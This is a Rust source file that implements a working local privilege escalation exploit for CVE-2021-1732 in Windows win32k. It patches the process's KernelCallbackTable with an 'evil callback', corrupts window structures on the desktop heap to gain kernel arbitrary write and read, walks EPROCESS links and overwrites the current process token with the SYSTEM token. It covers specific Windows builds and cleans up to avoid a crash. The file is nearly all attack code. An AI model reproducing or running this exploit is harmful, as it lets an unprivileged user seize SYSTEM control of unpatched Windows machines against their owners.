#![feature(asm)]
#[allow(unused)]
use windows::Win32::{
    UI::WindowsAndMessaging::{
            RegisterClassExA, WNDCLASSEXA, DefWindowProcA,
            CreateWindowExA, DestroyWindow,
            SetWindowLongA, CW_USEDEFAULT, GWLP_ID, HMENU, CreateMenu
    },
    System::LibraryLoader::{
            GetProcAddress, LoadLibraryA, 
            GetModuleHandleA 
    },
    Foundation::{
            HINSTANCE, LRESULT, GetLastError, SetLastError, WPARAM, LPARAM, 
            HWND, PSTR
    },
};
use std::{
    ffi::c_void,
    mem::{transmute, size_of},
    process::{exit, Command},
    ptr::null_mut,
    sync::RwLock
};
use lazy_static::lazy_static;

//it's a pain trying to safely pass state between main routine and win32 
//callback... just have to use globals
lazy_static!(
    static ref NTCALLBACKRETN : RwLock<usize> = RwLock::new(0);
    static ref NTCONCSOLECTRL : RwLock<usize> = RwLock::new(0);
    static ref GETNTVERSIONNUMS : RwLock<usize> = RwLock::new(0);
    static ref GETMENUBARINFO : RwLock<usize> = RwLock::new(0);
    static ref HMVALIDATEHANDLE : RwLock<isize> = RwLock::new(0);
    static ref SETWINDOWLONGPTR : RwLock<usize> = RwLock::new(0);
    static ref GLOBALHWND : RwLock<HWND> = RwLock::new(HWND(0));
    static ref DESKTOPHEAP : RwLock<usize> = RwLock::new(0);
    static ref REALLCALLBACK : RwLock<usize> = RwLock::new(0);
    static ref HWND0OFFSET : RwLock<usize> = RwLock::new(0);
    static ref VICTIMADDR : RwLock<usize> = RwLock::new(0);
    static ref EVILCONSOLEOFFS : RwLock<usize> = RwLock::new(0);
    static ref EVILTAGWNDOFFS : RwLock<usize> = RwLock::new(0);
    static ref CALLBACKSTATE : RwLock<u8> = RwLock::new(0);
);

//this is slightly annoying. by default RECT is defined as having signed ints 
//which is not what we want, since we're passing addresses. and also there's not
//a good default way to convert from signed int without discarding rhs bits, so
//I'll just define my own RECT type
#[repr(C)]
pub struct RECT {
    pub left: u32,
    pub top: u32,
    pub right: u32,
    pub bottom: u32,
}
#[repr(C)]
pub struct MENUBARINFO {
    pub cb_size: u32,
    pub rc_bar: RECT,
    pub h_menu: HMENU,
    pub hwnd_menu: HWND,
    pub _bitfield: i32,
}

type NtCallbackReturn = unsafe extern "system" fn(
    result: usize, resultlength: i64, status: i64) -> i32;
type NtUserConsoleControl = extern "stdcall" fn(
    consolecommand: u32, phwnd: usize, size: u64) -> u32;
type HMValidateHandle = extern "stdcall" fn(
    hwnd: HWND, htype: i32) -> *mut usize;
type HMValidateHandle1 = extern "stdcall" fn(
    hwnd: HMENU, htype: i32) -> *mut usize;
type ClientAllocWindowClassExtraBytes = extern "system" fn(
    size_t: *const u32
);
type RtlGetNtVersionNumbers = extern "stdcall" fn(
    majorversion: *const u32, minorversion: *const u32, buildnumber: *const u32
);
type SetWindowLongPtrA = extern "stdcall" fn(
    hwnd: HWND, n_index: i32, dw_new_long: usize
) -> usize;
type GetMenuBarInfo = extern "system" fn(
    hwnd:HWND, id_object: i32, id_item: i32, pmbi: *mut MENUBARINFO) -> i32;

fn main() {
    println!(">Initializing nt user functions");
    unsafe { 
    init_ntfunctions();
    println!(">Finding HMValidateHandle address");
    get_hmvalidatehandle_addr();
    println!(">Registering window classes");
    register_window_class_1();
    register_window_class_2();
    let pconsolectrl = NTCONCSOLECTRL.read().unwrap();
    let phmvalidate = HMVALIDATEHANDLE.read().unwrap();
    let pgetntversionnumbers = GETNTVERSIONNUMS.read().unwrap();
    let ntuserconsolecontrol : NtUserConsoleControl = transmute(*pconsolectrl);
    let hmvalidatehandle : HMValidateHandle = transmute(*phmvalidate);
    let getntversionnumbers : RtlGetNtVersionNumbers = transmute(
        *pgetntversionnumbers);
    let majorversion: u32 = 0;
    let minorversion: u32 = 0;
    let mut buildnumber: u32 = 0;
    //I only tested these builds
    getntversionnumbers(
        &majorversion as *const u32, &minorversion as *const u32, &buildnumber as *const u32
    );
    buildnumber &= 0xffff;
    if buildnumber < 16353 || buildnumber > 19042 {
        println!("[-]Build not supported {}", buildnumber);
        return;
    }
    //memory of this poor innocent wnds will be corrupted by evil callback >:]
    println!(">Creating first window");
    let victimhwnd0 = create_window_0();
    let pconsolehwnd: usize = (&victimhwnd0 as *const HWND) as usize;
    let victim0addr = hmvalidatehandle(victimhwnd0, 1);
    if victim0addr as usize == 0 {
        println!("[-]HMValidateHandle failed, exiting");
    }
    println!("[+]First window heap address: {:?}", victim0addr);
    println!(">Calling NtUserConsoleControl on victim window");
    //set cnWndClientExtra of first window into an offset into the kernel-mode
    //desktop heap, then retrieve that offset, save it for later
    ntuserconsolecontrol(6, pconsolehwnd, 0x10);
    let consoleoffs: usize = *((victim0addr as usize + 0x128) as *const usize);
    if consoleoffs == 0 || consoleoffs == pconsolehwnd {
        println!("[-]NtUserConsoleControl failed, exiting");
        return;
    }
    //NtUserConsoleControl changes *cbWndClientExtra to an offset of a structure
    //from the kernel desktop heap base. We'll have control over a kernel
    //offset, which is almost as good as a pointer.
    //make several more to ensure that handle assignment is deterministic
    for _x in 0..7 {
        let fillerwnd = create_window_0();
        DestroyWindow(fillerwnd);
        }
    let victimhwnd1 = create_window_1();
    let lasthwnd1 = create_window_0();
    let mut globalhwnd = GLOBALHWND.write().unwrap();
    let mut realcallback = REALLCALLBACK.write().unwrap();
    *globalhwnd = lasthwnd1;
    drop(globalhwnd);
    DestroyWindow(lasthwnd1);
    //save second window address for later for read/write primitive
    let victim1addr: *mut usize = hmvalidatehandle(victimhwnd1, 1);
    if victim1addr as usize == 0 {
        println!("[-]HMValidateHandle failed, exiting");
    }
    println!("[+]Second window heap address: {:?}", victim1addr);
    let mut gaddr = VICTIMADDR.write().unwrap();
    *gaddr = victim1addr as usize;
    drop(gaddr);
    //get base address of user-mode desktop heap so we know where exactly we 
    //are in memory
    println!(">Getting user-mapped desktop heap address");
    let tebptr = cve_2021_1732_new::get_teb();
    println!("[+]TEB address: {:?}", tebptr);
    let desktopheap = cve_2021_1732::get_um_mapped_desktopheap(tebptr);
    println!("[+]Desktop heap address: {:#x}", desktopheap);
    let mut udesktopheap = DESKTOPHEAP.write().unwrap();
    *udesktopheap = desktopheap;
    drop(udesktopheap);
    //the user-mode desktop heap state shadows kernel-mode desktop heap, so the 
    //offset of tagWND from heap base should be the same. we can just get it by
    //(victim tagWND address) - (user-mode desktop heap base address)
    //or from *(word *)ptagWND+8
    let tagwnd0offset = (victim0addr as usize) - (desktopheap as usize);
    let mut gvictimoffs = HWND0OFFSET.write().unwrap();
    *gvictimoffs = tagwnd0offset;
    drop(gvictimoffs);
    let tagwnd1offset = (victim1addr as usize) - (desktopheap as usize);
    //hook __xxxClientAllocWindowCLassExtraBytes
    println!(">Patching KernelCallbackTable with evil callback");
    let evilcallback = evil_callback as *mut c_void;
    println!("[+]Evil callback address: {:?}", evilcallback);
    let pebptr = cve_2021_1732::get_peb();
    println!("[+]PEB address: {:?}", pebptr);
    let callbacktable: usize = cve_2021_1732::get_callback_table(pebptr);
    println!("[+]Callback table address: {:#x}", callbacktable);
    let tableoffset : usize = 0x7B;
    let callbackaddr : usize = *((callbacktable + 
        (tableoffset * size_of::<usize>())) as *const usize);
    *realcallback = callbackaddr;
    drop(realcallback);
    cve_2021_1732::patch_callback_table(
        evilcallback, callbacktable as *mut c_void, tableoffset);
    //trigger evil callback
    let mut evilhwnd = create_window_2();
    let gcallbackstate = CALLBACKSTATE.read().unwrap();
    if *gcallbackstate == 1 {
        return;
    }
    //try to get arbitrary write primitive by setting third wnd size.
    //after callback, its cbWndClientExtra now points to kernel offset of first 
    //window. so while SetWindowLong/SetWindowLongPtr thinks it's writing to
    //the extra bytes, it's writing to the first wnd's private server-side 
    //class attributes
    println!(">Trying write to first window through third window");
    let awstatus: u8 = arbitrary_write_test(evilhwnd);
    if awstatus == 1 {
        println!("[-]Write primitive failed");
        let pevilhwnd: usize = (&mut evilhwnd as *const HWND) as usize;
        ntuserconsolecontrol(6, pevilhwnd, 0x10);
        return;
    }
    println!("[+]Got arbitrary write primitive");
    println!(">Trying arbitrary read primitive through corrupted tagMENU structure");
    //unsafe fn arbitrary_read_test(hwnd0offset: usize, hwnd1offset: usize, 
    //menuaddr: usize, tagwnd1addr: usize, hwnd0: HWND, hwnd1: HWND, 
    //menuoffs: usize, menuhandle: HMENU) -> u8 {
    //tagwnd0offset, tagwnd1offset, menuaddr, victim1addr as usize, victimhwnd0, victimhwnd1, menuaddr, menuhandle
    let arstatus: u8 = arbitrary_read_write(tagwnd1offset,
        victim1addr as usize, victimhwnd0, victimhwnd1, desktopheap as usize,
        buildnumber);
    if arstatus == 1 {
        println!("[-]Arbitrary read failed, cleaning up");
        cleanup1(consoleoffs, victimhwnd0, tagwnd0offset, evilhwnd);
        return;
    }
    println!("[+]Cleaning up!");
    cleanup1(consoleoffs, victimhwnd0, tagwnd0offset, evilhwnd);
    Command::new("cmd")
            .args(&["/C", "echo enjoy ur root shell :3"])
            .spawn()
            .expect("cmd.exe failed to start");
    };
}

//boilerplate FFI stuff
unsafe fn init_ntfunctions() {
    let u32str = b"user32.dll\0";
    let ntdllstr = b"ntdll\0";
    let w32ustr = b"win32u\0";
    let ntcallbackstr = b"NtCallbackReturn\0";
    let ntconsolestr = b"NtUserConsoleControl\0";
    let setwlptstr = b"SetWindowLongPtrA\0";
    let getntverstr = b"RtlGetNtVersionNumbers\0";
    let getmenubarinfstr = b"GetMenuBarInfo\0";

    let hnduser32 = LoadLibraryA(PSTR(u32str.as_ptr() as _));
    let hndntdll = GetModuleHandleA(PSTR(ntdllstr.as_ptr() as _));
    let hndwin32u = GetModuleHandleA(PSTR(w32ustr.as_ptr() as _));
    let mut pntcallbackreturn = NTCALLBACKRETN.write().unwrap();
    let mut pntconsolecontrol = NTCONCSOLECTRL.write().unwrap();
    let mut psetwindowlongptr = SETWINDOWLONGPTR.write().unwrap();
    let mut pgetntversionnums = GETNTVERSIONNUMS.write().unwrap();
    let mut pgetmenubarinfo = GETMENUBARINFO.write().unwrap();
    *pntcallbackreturn = GetProcAddress(
        hndntdll, PSTR(ntcallbackstr.as_ptr() as _)).unwrap() as usize;
    *pntconsolecontrol = GetProcAddress(
        hndwin32u, PSTR(ntconsolestr.as_ptr() as _)).unwrap() as usize;
    *psetwindowlongptr = GetProcAddress(
        hnduser32, PSTR(setwlptstr.as_ptr() as _)).unwrap() as usize;
    *pgetntversionnums = GetProcAddress(
        hndntdll, PSTR(getntverstr.as_ptr() as _)).unwrap() as usize;
    *pgetmenubarinfo = GetProcAddress(
        hnduser32, PSTR(getmenubarinfstr.as_ptr() as _)).unwrap() as usize;
}

//just a typical way of grabbing HMValidateHandle from GetMenuState(), similar 
//to IsMenu()
unsafe fn get_hmvalidatehandle_addr() {
    let u32str = b"user32\0";
    let getmenustr = b"GetMenuState\0";
    let mut hmvhoffset : isize = 0;

    let hnduser32 = GetModuleHandleA(PSTR(u32str.as_ptr() as _));
    //get address of GetMenuState() and parse it until the first call 
    //instruction (e8), which will bet to HMValidateHandle
    let getmenuaddr : isize = GetProcAddress(
        hnduser32, PSTR(getmenustr.as_ptr() as _)).unwrap() as isize;
    for i in 0..0x100 {
        let byte: u8 = *((getmenuaddr + i) as *const u8);
        if byte == 0xe8 {
            hmvhoffset = i + 1;
            break;
        }
    }
    if hmvhoffset == 0 {
        println!("[-]Didn't find HMValidateHandle, exiting");
        exit(0x1);
    }
    let calladdr: i32 = *((getmenuaddr + hmvhoffset) as *const i32);
    let calloffs: isize = (getmenuaddr - hnduser32.0) + calladdr as isize;
    //skip over padding
    let hmvhaddr: isize = hnduser32.0 + calloffs + 0x16;
    println!("[+]HMValidateHandle address: {:#x}", hmvhaddr);
    let mut phmvalidatehandle = HMVALIDATEHANDLE.write().unwrap();
    *phmvalidatehandle = hmvhaddr;
}

unsafe fn register_window_class_1() {
    let instance1 = GetModuleHandleA(None);
    let class1name = b"victimWnd\0";
    let mut class1 = WNDCLASSEXA::default();
    class1.hInstance = instance1;
    class1.lpszClassName = PSTR(class1name.as_ptr() as _);
    class1.lpfnWndProc = Some(wndproc);
    class1.cbWndExtra = 0x70;
    class1.cbClsExtra = 0;
    class1.cbSize = 0x50;
    class1.style = 3;

    RegisterClassExA(&class1);
}

unsafe fn register_window_class_2() {
    let instance1 = GetModuleHandleA(None);
    let class1name = b"sploitWnd\0";
    let mut class1 = WNDCLASSEXA::default();
    class1.hInstance = instance1;
    class1.lpszClassName = PSTR(class1name.as_ptr() as _);
    class1.lpfnWndProc = Some(wndproc);
    class1.cbWndExtra= 0x200;
    class1.cbClsExtra = 0;
    class1.cbSize = 0x50;
    class1.style = 3;

    RegisterClassExA(&class1);
}

//ntuserconsolecontrol will change the cbwndclientextra of this window to an 
//offset into the desktop heap; another corrupted window will overwrite its 
//private bytes like cbwndclientextra offset and cbwndclientextrasize, enabling
//arbitrary write
unsafe fn create_window_0() -> HWND {
    let instance1 = GetModuleHandleA(None);
    let class1name = b"victimWnd\0";
    let wnd1title = b"victimWnd\0";
    let hwnd1 = CreateWindowExA(
        0, 
        PSTR(class1name.as_ptr() as _), 
        PSTR(wnd1title.as_ptr() as _),
        0,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        HWND(0),
        HMENU(0),
        instance1,
        null_mut());
    hwnd1
}

//this one will have a system menu; the arbitrary write primitive will be used 
//to overwrite the address of the menu to a fake one, which can then be used to 
//read from an arbitrary location
unsafe fn create_window_1() -> HWND {
    let instance1 = GetModuleHandleA(None);
    let class1name = b"victimWnd\0";
    let wnd1title = b"victimWnd\0";
    let sysmenu: HMENU = CreateMenu();
    let hwnd1 = CreateWindowExA(
        0, 
        PSTR(class1name.as_ptr() as _), 
        PSTR(wnd1title.as_ptr() as _),
        0,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        HWND(0),
        sysmenu,
        instance1,
        null_mut());
    hwnd1
}

//ntuserconsolecontrol will be called to turn cbwndclientextra into an offset, 
//which will be modified to the desktop heap offset of the first window, 
//allowing us to overwrite the first window private bytes
unsafe fn create_window_2() -> HWND {
    let instance1 = GetModuleHandleA(None);
    let class1name = b"sploitWnd\0";
    let wnd1title = b"sploitWnd\0";
    let hwnd1 = CreateWindowExA(
        0, 
        PSTR(class1name.as_ptr() as _), 
        PSTR(wnd1title.as_ptr() as _),
        0,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        HWND(0),
        HMENU(0),
        instance1,
        null_mut());
    hwnd1
}

//make sure arbitrary write works and change size of first window so it can 
//write anywhere on the desktop heap
unsafe fn arbitrary_write_test(evilhwnd: HWND) -> u8 {
    //should be able to write to the first kernel tagWND now
    //set first window cbWndExtraSize to a ridiculous size to get arb. write
    SetLastError(0);
    let mut status = SetWindowLongA(evilhwnd, 0xc8, 0xfffffff);
    let mut err = GetLastError();
    if status == 0 && err != 0 {
        return 1
    }
    //set window 0 cbwndextra heap offset to a small size, to write from the 
    //start of desktop heap, using evilhwnd
    status = SetWindowLongA(evilhwnd, 0x128, 0x20);
    err = GetLastError();
    if status == 0 && err != 0 {
        return 1
    }
    0
}

//set up corrupted window/fake allocation for arbitrary read primitive, then
//execute token stealing shellcode
unsafe fn arbitrary_read_write(hwnd1offset: usize, 
    tagwnd1addr: usize, hwnd0: HWND, hwnd1: HWND, desktopheap: usize,
    buildnumber: u32) -> u8 {
    let phmvalidate = HMVALIDATEHANDLE.read().unwrap();
    let hmvalidatehandle1 : HMValidateHandle1 = transmute(*phmvalidate);
    let psetwindlongptra = SETWINDOWLONGPTR.read().unwrap();
    let setwindowlongptra: SetWindowLongPtrA = transmute(*psetwindlongptra);
    let pgetmenubarinfo = GETMENUBARINFO.read().unwrap();
    let getmenubarinfo: GetMenuBarInfo = transmute(*pgetmenubarinfo);
    //change window style to have ws_child so SetWindowLongPtr can set a new menu
    let nindex: i32 = (0x18 + hwnd1offset - 0x20) as i32;
    let tagwnd1style: usize = *((tagwnd1addr + 0x18) as *const usize); 
    //xxxSetWindowData expects that the window is subclassed, but is 
    //actually overwriting the system menu pointer with a pointer to a 
    //structure of our design
    let newstyle: usize = tagwnd1style ^ 0x4000000000000000;
    //no deadbeefs, save the cows. just a savvy, stylish cafe babe
    let cafebabe: usize = 0xcafebabecafebabe;
    let pcafebabe: usize = (&cafebabe as *const _) as usize;
    //put some imposter win32 objects on the process heap
    //xxxGetMenuBarInfo will read from wherever, doesn't gaf
    let mut fakepmenu: Vec<usize> = vec![0; 0x120];
    let mut fakerect: Vec<usize> = vec![0; 0x120];
    //rect starts +0x40 from the start of menuinfo struct
    fakerect[0] = pcafebabe - 0x40;
    fakepmenu[0] = fakepmenu.as_ptr() as usize;
    //flags that need to be set for getmenubarinfo
    fakepmenu[8] = 0x1000000010000000;
    //menuinfo at +0x58 from start of menu allocation
    fakepmenu[0xb] = fakerect.as_ptr() as usize;
    //tagmenu handle at +0x98 from start of menu allocation
    fakepmenu[0x13] = fakepmenu.as_ptr() as usize;
    SetLastError(0);
    //set window style of second window through first window
    //change style of second window to WS_CHILD so it can be associated to fake 
    //menu structure
    let mut oldstyle: usize = setwindowlongptra(hwnd0, nindex, newstyle);
    let mut err: u32 = GetLastError();
    if oldstyle == 0 && err != 0 {
        return 1
    }
    SetLastError(0);
    //change menu of second window to fake menu
    println!(">Creating fake menu");
    let menuhandle: HMENU = CreateMenu();
    CreateMenu();
    let menuaddr: *mut usize = hmvalidatehandle1(menuhandle, 2);
    if menuaddr as usize == 0 {
        println!("[-]HMValidateHandle failed, exiting");
        return 1
    }
    //*handle+0x28 = tagWnd
    fakepmenu[5] = menuaddr as usize;
    let menuoffs: usize = (menuaddr as usize) - (desktopheap as usize);
    //number of items bitflag used by getmenuitemrect, getmenubarinfo, 
    //insertmenuitem, etc etc
    let numitemsindex: i32 = ((menuoffs + 0x2C) - 0x20) as i32;
    //item's "region" relative to top-left coords of menu
    let regionindex: i32 = ((hwnd1offset + 0x58) - 0x20) as i32;
    //affects format of output into rect
    let someflagindex: i32 = ((hwnd1offset + 0x1a) - 0x20) as i32;
    println!(">Setting menu pointer of corrupted hwnd to fake allocation");
    SetLastError(0);
    //set menubarinfo pointer of fake menu to arbitrary adddress
    //setwindowlongptra returns the previous longlong which has the nice
    //benefit of giving us the kernel address of a desktop allocation
    let pmenu: usize = setwindowlongptra(hwnd1, GWLP_ID, fakepmenu.as_ptr() as usize);
    err = GetLastError();
    println!("[+]System menu allocation address: {:#x}", pmenu);
    if pmenu == 0 || err != 0 {
        return 1
    }
    SetLastError(0);
    //set number of menu items so the index passed to getmenubarinfo looks legit
    let oldnumitems: i32 = SetWindowLongA(hwnd0, numitemsindex, 1);
    //set some flag that determines how the menu bar coordinates are returned
    let oldsomeflag: i32 = SetWindowLongA(hwnd0, someflagindex, 0);
    err = GetLastError();
    if oldnumitems == 0 && err != 0 {
        return 1
    }
    SetLastError(0);
    //set the style back again so xxxGetMenuBarInfo can read the (fake) system 
    //menu
    oldstyle = setwindowlongptra(hwnd0, nindex, tagwnd1style);
    //set some different values that get added to the coordinates ("region" or 
    //something)
    let oldregion: usize = setwindowlongptra(hwnd0, regionindex, 0);
    let oldregion2: usize = setwindowlongptra(hwnd0, regionindex+8, 0);
    err = GetLastError();
    if oldstyle == 0 && err != 0 {
        return 1
    }
    let newrect: RECT = RECT{ left: 0, top: 0, right: 0, bottom: 0 };
    //you can try getmenuitemrect too, it's maybe just a little more math
    //let rekt: *const RECT = &newrect as *const RECT;
    //let pnewrect = rekt as *mut RECT;
    //GetMenuItemRect(hwnd0, menuhandle, 0, pnewrect);
    //let ldw: u32 = newrect.right - newrect.left;
    //let hdw: u32 = newrect.bottom - newrect.top;
    //let qwresult: u64 = ((hdw as u64) << 0x20) + (ldw as u64);
    //println!("eh{:#x}", qwresult);
    let menubarinf : MENUBARINFO = MENUBARINFO{ cb_size: 0x30, rc_bar: newrect, h_menu: HMENU(0), hwnd_menu: HWND(0), _bitfield: 0 };
    let pmenubarinf : *mut MENUBARINFO = (&menubarinf as *const _) as *mut MENUBARINFO;
    getmenubarinfo(hwnd1, -3, 1, pmenubarinf);
    let mut qwresult: usize = (menubarinf.rc_bar.left as usize) + ((menubarinf.rc_bar.top as usize) << 0x20);
    //it should work reliably like, all the time, but just checking...
    if qwresult != 0xcafebabecafebabe {
        SetWindowLongA(hwnd0, numitemsindex, oldnumitems);
        SetWindowLongA(hwnd0, someflagindex, oldsomeflag);
        setwindowlongptra(hwnd0, regionindex, oldregion);
        setwindowlongptra(hwnd0, regionindex+8, oldregion2);
        setwindowlongptra(hwnd0, nindex, newstyle);
        setwindowlongptra(hwnd1, GWLP_ID, pmenu);
        setwindowlongptra(hwnd0, nindex, tagwnd1style);
        return 1
    }
    println!("[+]Got arbitrary read primitive! Now we're cooking with fire");
    //it's just convenient that win32 desktop objects have a pointer to the
    //thread object info structure, which has a pointer to the kernel EPROCESS
    //EPROCESS address is at *(*pMenu->ParentWND+0x10)+0x1a0
    //pMenu->ParentWND at *MENU+0x50
    fakerect[0] = pmenu + 0x10;
    getmenubarinfo(hwnd1, -3, 1, pmenubarinf);
    qwresult = (menubarinf.rc_bar.left as usize) + ((menubarinf.rc_bar.top as usize) << 0x20);
    //THROBJHEAD->THREADINFO at *WND+0x10
    fakerect[0] = qwresult - 0x30;
    getmenubarinfo(hwnd1, -3, 1, pmenubarinf);
    qwresult = (menubarinf.rc_bar.left as usize) + ((menubarinf.rc_bar.top as usize) << 0x20);
    //PROCESSINFO at *THREADINFO+0x1a0
    fakerect[0] = qwresult + 0x160;
    getmenubarinfo(hwnd1, -3, 1, pmenubarinf);
    qwresult = (menubarinf.rc_bar.left as usize) + ((menubarinf.rc_bar.top as usize) << 0x20);
    //EPROCESS at *PROCESSINFO
    fakerect[0] = qwresult - 0x40;
    getmenubarinfo(hwnd1, -3, 1, pmenubarinf);
    qwresult = (menubarinf.rc_bar.left as usize) + ((menubarinf.rc_bar.top as usize) << 0x20);
    println!("[+]EPROCESS address: {:#x}", qwresult);
    let mut peprocess: usize = qwresult;
    //okay ... your bog standard token-stealing shellcode
    //setting some offsets for token-stealing shellcode
    let mut uniqueprocessid: u32 = 0;
    let mut inheritedfromuniquepid: u32 = 0;
    let mut token: u32 = 0;
    let mut activeprocesslinks: u32 = 0;
    //maybe it would work on 20h2 but haven't tested
    //https://www.vergiliusproject.com/ has struct of all kernel builds
    if buildnumber >= 18204 && buildnumber < 18836 {
        uniqueprocessid = 0x2e8;
        inheritedfromuniquepid = 0x3e8;
        token = 0x360;
        activeprocesslinks = 0x2f0;
    }
    else if buildnumber >= 18836 {
        uniqueprocessid = 0x440;
        inheritedfromuniquepid = 0x540;
        token = 0x4b8;
        activeprocesslinks = 0x448;
    }
    else {
        uniqueprocessid = 0x2e0;
        inheritedfromuniquepid = 0x3e0;
        token = 0x358;
        activeprocesslinks = 0x2e8;
    }
    //just traverse process links to find SYSTEM process token and replace
    //process token to that one
    let mut systemtokenaddress: usize = 0;
    let mut currenttokenaddress: usize = 0;
    let mut currenttokenhandle: usize = 0;
    //get PID of parent process
    fakerect[0] = peprocess + (inheritedfromuniquepid as usize - 0x40);
    getmenubarinfo(hwnd1, -3, 1, pmenubarinf);
    let currentpid: usize = (menubarinf.rc_bar.left as usize) + ((menubarinf.rc_bar.top as usize) << 0x20) & 0xffffffff;
    println!("[+]Parent process PID: {:#x}", currentpid);
    while systemtokenaddress == 0 || currenttokenaddress == 0 {
        fakerect[0] = peprocess + (uniqueprocessid as usize - 0x40);
        getmenubarinfo(hwnd1, -3, 1, pmenubarinf);
        qwresult = (menubarinf.rc_bar.left as usize) + ((menubarinf.rc_bar.top as usize) << 0x20) & 0xffffffff;
        //find token process with PID == 4 (SYSTEM token)
        if qwresult == 4 {
            fakerect[0] = peprocess + (token as usize - 0x40);
            getmenubarinfo(hwnd1, -3, 1, pmenubarinf);
            systemtokenaddress = (menubarinf.rc_bar.left as usize) + ((menubarinf.rc_bar.top as usize) << 0x20);
            println!("[+]System process token address: {:#x}", systemtokenaddress);
        }
        //find token of process with PID == (current PID)
        if qwresult == currentpid {
            fakerect[0] = peprocess + (token as usize - 0x40);
            getmenubarinfo(hwnd1, -3, 1, pmenubarinf);
            currenttokenaddress = (menubarinf.rc_bar.left as usize) + ((menubarinf.rc_bar.top as usize) << 0x20);
            println!("[+]Current process token address: {:#x}", currenttokenaddress);
            currenttokenhandle = peprocess + (token as usize);
        }
        //advance through process links until both are found
        fakerect[0] = peprocess + (activeprocesslinks as usize - 0x40);
        getmenubarinfo(hwnd1, -3, 1, pmenubarinf);
        peprocess = (menubarinf.rc_bar.left as usize) + ((menubarinf.rc_bar.top as usize) << 0x20);
        peprocess -= activeprocesslinks as usize;
    }
    //write token of current process using write primitive
    println!(">Overwriting current processs token to SYSTEM token");
    let writewhereindex: i32 = (0x128 + hwnd1offset - 0x20) as i32;
    //write where
    let cbwndextra: usize = setwindowlongptra(hwnd0, writewhereindex, currenttokenhandle);
    //write what
    setwindowlongptra(hwnd1, 0, systemtokenaddress);
    //fix up cbWndExtra value of second tagWND
    setwindowlongptra(hwnd0, writewhereindex, cbwndextra);
    //clean up some values to prevent any bluescreen
    SetWindowLongA(hwnd0, numitemsindex, oldnumitems);
    SetWindowLongA(hwnd0, someflagindex, oldsomeflag);
    setwindowlongptra(hwnd0, regionindex, oldregion);
    setwindowlongptra(hwnd0, regionindex+8, oldregion2);
    setwindowlongptra(hwnd0, nindex, newstyle);
    setwindowlongptra(hwnd1, GWLP_ID, pmenu);
    setwindowlongptra(hwnd0, nindex, tagwnd1style);
    0
}

unsafe fn cleanup1(consoleoffset0: usize, hwnd0: HWND, tagwnd0offset: usize, 
    evilhwnd: HWND) {
    let eviltagwndoffs = EVILTAGWNDOFFS.read().unwrap();
    let evilconsoleoffs = EVILCONSOLEOFFS.read().unwrap();
    //set evilhwnd desktop heap offset to the "right" value
    let nindex0: i32 = (*eviltagwndoffs as i32) + 0x108;
    SetWindowLongA(hwnd0, nindex0, *evilconsoleoffs as i32);
    //destroy evilhwnd
    DestroyWindow(evilhwnd);
    //set window 0 cbwndextra offset again this time to tagWnd+0xc8
    let nindex1: i32 = (tagwnd0offset as i32) + 0x108;
    let nindex2: i32 = (tagwnd0offset as i32) + 0xc8;
    SetWindowLongA(hwnd0, nindex1, nindex2);
    //change window 0 cbwndextrasize to the original value
    SetWindowLongA(hwnd0, 0, 0x70);
    //change window 0 cbwndextra value *once again* to the right offset
    SetWindowLongA(hwnd0, 0x60, consoleoffset0 as i32);
    //destroy window 0
    DestroyWindow(hwnd0);
}

extern "stdcall" fn evil_callback(cbwndextrasize: *const u32) {
    println!("[+]Inside Callback");
    //we want to pass a lot of state back and forth to the client process
    //even though windows doesn't want us doing that.
    let pntcallback = NTCALLBACKRETN.read().unwrap();
    let pntconsole = NTCONCSOLECTRL.read().unwrap();
    let ghwnd = GLOBALHWND.read().unwrap();
    let phmvh = HMVALIDATEHANDLE.read().unwrap();
    let pdesktopheap = DESKTOPHEAP.read().unwrap();
    let realcallback = REALLCALLBACK.read().unwrap();
    let hwnd0offset = HWND0OFFSET.read().unwrap();
    let mut tagwndoffset = EVILTAGWNDOFFS.write().unwrap();
    let mut evilconsoleoffs = EVILCONSOLEOFFS.write().unwrap();
    let mut gcallbackstate = CALLBACKSTATE.write().unwrap();
    unsafe {
        let hmvalidatehandle: HMValidateHandle = transmute(*phmvh);
        let ntcallbackreturn: NtCallbackReturn = transmute(*pntcallback);
        let ntuserconsolecontrol: NtUserConsoleControl = transmute(*pntconsole);
        let clientallocw: ClientAllocWindowClassExtraBytes = transmute(
            *realcallback);
        //fall through to the real callback if the window doesn't have special 
        //size
        if *cbwndextrasize != 0x200 {
            drop(gcallbackstate);
            drop(tagwndoffset);
            drop(evilconsoleoffs);
            clientallocw(cbwndextrasize);
            return
        }
        //the object handle number is incremented each time an object is alloced
        //we know the last window created, we should be able to guess the hwnd
        //of the current one without hunting for it on the desktop heap
        let tableindex: isize = ghwnd.0 & 0xffff;
        let objecthandle: isize = ((ghwnd.0 >> 0x10) & 0xffff) + 1;
        let nexthwnd: isize = tableindex | objecthandle << 0x10;
        let mut consolehwnd: HWND = HWND(nexthwnd);
        let pconsolehwnd: usize = (&mut consolehwnd as *const HWND) as usize;
        //get the addres to calculate its offset
        let consoletagwnd: *mut usize = hmvalidatehandle(consolehwnd, 1);
        if (consoletagwnd as usize) == 0 {
            println!("[-]Couldn't find HWND. Exiting gracefully. Try again and it should work");
            *gcallbackstate = 1;
            drop(gcallbackstate);
            clientallocw(cbwndextrasize);
            return;
        }
        let computeddelta: usize = (consoletagwnd as usize) - *pdesktopheap;
        //also you can get the offset this way
        let tagwnddelta: usize = *((
            consoletagwnd as usize + 0x8) as *const usize);
        //you never know...
        if tagwnddelta != computeddelta {
            println!("[-]Heap state is messed up somehow, exiting");
            *gcallbackstate = 1;
            drop(gcallbackstate);
            clientallocw(cbwndextrasize);
            return;
        }
        *tagwndoffset = computeddelta;
        drop(tagwndoffset);
        println!(">Calling NtUserConsoleControl on evil wnd");
        //Will change cbWndExtra to an offset and set a flag (with any luck)
        ntuserconsolecontrol(6, pconsolehwnd, 0x10);
        //now get the offset and save it for later
        let consoleoffs: usize = *((
            consoletagwnd as usize + 0x128) as *const usize);
        *evilconsoleoffs = consoleoffs;
        drop(evilconsoleoffs);
        //let resultptr : *const usize = &result as *const usize;
        let pinned: usize = *hwnd0offset;
        let fakeoffs: usize = (&pinned as *const _) as usize;
        //result of NtCallbackReturn will override previous offset, but 0xe8 
        //flag is still set
        drop(gcallbackstate);
        ntcallbackreturn(fakeoffs, 0x18, 0);
    };
}

